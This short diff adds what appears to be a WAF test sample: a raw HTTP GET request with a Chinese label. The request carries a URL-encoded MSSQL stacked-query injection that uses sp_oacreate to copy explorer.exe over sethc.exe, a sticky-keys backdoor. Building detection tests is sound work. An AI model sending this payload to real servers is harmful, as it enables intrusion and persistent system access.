@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506421
+# 攻击者基于堆叠查询，将"declare @o int;exec sp_oacreate 'scripting.filesystemobject', @o out;exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe','c:\windows\system32\sethc.exe';exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe'"语句注入到 SQL 查询参数中，目的是创建OLE对象实例并替换粘贴键。
+GET /?id=1%3Bdeclare%20@o%20int%3Bexec%20sp_oacreate%20%27scripting.filesystemobject%27%2C%20@o%20out%3Bexec%20sp_oamethod%20@o%2C%20%27copyfile%27%2Cnull%2C%27c:%5Cwindows%5Cexplorer.exe%27%2C%27c:%5Cwindows%5Csystem32%5Csethc.exe%27%3Bexec%20sp_oamethod%20@o%2C%20%27copyfile%27%2Cnull%2C%27c:%5Cwindows%5Csystem32%5Csethc.exe%27%20%2C%27c:%5Cwindows%5Csystem32%5Cdllcache%5Csethc.exe%27&bid=hd_tag_m8mv26og HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26og
+RM-PRO-Token: 791251b7a2afe7be48e14bf005c2e098
+RM-PRO-Time: 1742808645127
+User-Agent: curl/7.83.1
+
